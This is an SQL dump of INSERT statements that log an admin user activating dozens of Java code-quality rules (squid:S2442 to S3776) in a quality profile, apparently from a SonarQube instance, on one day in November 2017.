INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4012, '2017-11-20 13:05:43.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2442;ruleKey=squid:S2442;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNIUbbGRdfPp-rcQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4013, '2017-11-20 13:05:43.474', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2445;ruleKey=squid:S2445;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNIybbGRdfPp-rcR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4014, '2017-11-20 13:05:43.497', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2446;ruleKey=squid:S2446;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNJJbbGRdfPp-rcS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4015, '2017-11-20 13:05:43.521', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2447;ruleKey=squid:S2447;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNJhbbGRdfPp-rcT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4016, '2017-11-20 13:05:43.546', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNJ6bbGRdfPp-rcU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4017, '2017-11-20 13:05:43.579', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNKbbbGRdfPp-rcV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4018, '2017-11-20 13:05:43.615', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNK_bbGRdfPp-rcW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4019, '2017-11-20 13:05:43.647', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNLfbbGRdfPp-rcX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4020, '2017-11-20 13:05:43.686', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNMFbbGRdfPp-rcY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4021, '2017-11-20 13:05:43.721', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNMpbbGRdfPp-rcZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4022, '2017-11-20 13:05:43.758', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNNObbGRdfPp-rca');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4023, '2017-11-20 13:05:43.787', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNNrbbGRdfPp-rcb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4024, '2017-11-20 13:05:43.812', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNOEbbGRdfPp-rcc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4025, '2017-11-20 13:05:43.834', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNOabbGRdfPp-rcd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4026, '2017-11-20 13:05:43.857', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNOxbbGRdfPp-rce');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4027, '2017-11-20 13:05:43.9', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNPcbbGRdfPp-rcf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4028, '2017-11-20 13:05:43.926', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNP2bbGRdfPp-rcg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4029, '2017-11-20 13:05:43.951', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNQPbbGRdfPp-rch');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4030, '2017-11-20 13:05:43.976', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNQobbGRdfPp-rci');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4031, '2017-11-20 13:05:44', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNRAbbGRdfPp-rcj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4032, '2017-11-20 13:05:44.024', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNRYbbGRdfPp-rck');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4033, '2017-11-20 13:05:44.048', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNRwbbGRdfPp-rcl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4034, '2017-11-20 13:05:44.07', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNSGbbGRdfPp-rcm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4035, '2017-11-20 13:05:44.093', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNSdbbGRdfPp-rcn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4036, '2017-11-20 13:05:44.11', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNSubbGRdfPp-rco');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4037, '2017-11-20 13:05:44.133', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNTFbbGRdfPp-rcp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4038, '2017-11-20 13:05:44.157', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNTdbbGRdfPp-rcq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4039, '2017-11-20 13:05:44.181', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNT1bbGRdfPp-rcr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4040, '2017-11-20 13:05:44.198', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNUGbbGRdfPp-rcs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4041, '2017-11-20 13:05:44.221', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNUdbbGRdfPp-rct');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4042, '2017-11-20 13:05:44.238', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNUubbGRdfPp-rcu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4043, '2017-11-20 13:05:44.261', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNVFbbGRdfPp-rcv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4044, '2017-11-20 13:05:44.285', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNVdbbGRdfPp-rcw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4045, '2017-11-20 13:05:44.309', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNV1bbGRdfPp-rcx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4046, '2017-11-20 13:05:44.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNWHbbGRdfPp-rcy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4047, '2017-11-20 13:05:44.343', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNWXbbGRdfPp-rcz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4048, '2017-11-20 13:05:44.368', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNWwbbGRdfPp-rc0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4049, '2017-11-20 13:05:44.419', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNXjbbGRdfPp-rc1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4050, '2017-11-20 13:05:44.463', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNYPbbGRdfPp-rc2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4051, '2017-11-20 13:05:44.53', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNZRbbGRdfPp-rc3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4052, '2017-11-20 13:05:44.579', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNaDbbGRdfPp-rc4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4053, '2017-11-20 13:05:44.642', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNbCbbGRdfPp-rc5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4054, '2017-11-20 13:05:44.763', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNc7bbGRdfPp-rc6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4055, '2017-11-20 13:05:44.803', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNdjbbGRdfPp-rc7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4056, '2017-11-20 13:05:44.828', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNd8bbGRdfPp-rc8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4057, '2017-11-20 13:05:44.844', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNeMbbGRdfPp-rc9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4058, '2017-11-20 13:05:44.868', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNekbbGRdfPp-rc-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4059, '2017-11-20 13:05:44.896', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNfAbbGRdfPp-rc_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4060, '2017-11-20 13:05:44.916', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNfUbbGRdfPp-rdA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4061, '2017-11-20 13:05:44.932', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNfkbbGRdfPp-rdB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4062, '2017-11-20 13:05:44.947', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNfzbbGRdfPp-rdC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4063, '2017-11-20 13:05:44.97', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNgKbbGRdfPp-rdD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4064, '2017-11-20 13:05:44.995', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNgjbbGRdfPp-rdE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4065, '2017-11-20 13:05:45.03', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNhGbbGRdfPp-rdF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4066, '2017-11-20 13:05:45.064', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNhobbGRdfPp-rdG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4067, '2017-11-20 13:05:45.09', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNiCbbGRdfPp-rdH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4068, '2017-11-20 13:05:45.115', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNibbbGRdfPp-rdI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4069, '2017-11-20 13:05:45.139', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNizbbGRdfPp-rdJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4070, '2017-11-20 13:05:45.164', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNjMbbGRdfPp-rdK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4071, '2017-11-20 13:05:45.188', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNjkbbGRdfPp-rdL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4072, '2017-11-20 13:05:45.213', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNj9bbGRdfPp-rdM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4073, '2017-11-20 13:05:45.236', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNkUbbGRdfPp-rdN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (4074, '2017-11-20 13:05:45.269', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy003-59869;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZiNk1bbGRdfPp-rdO');
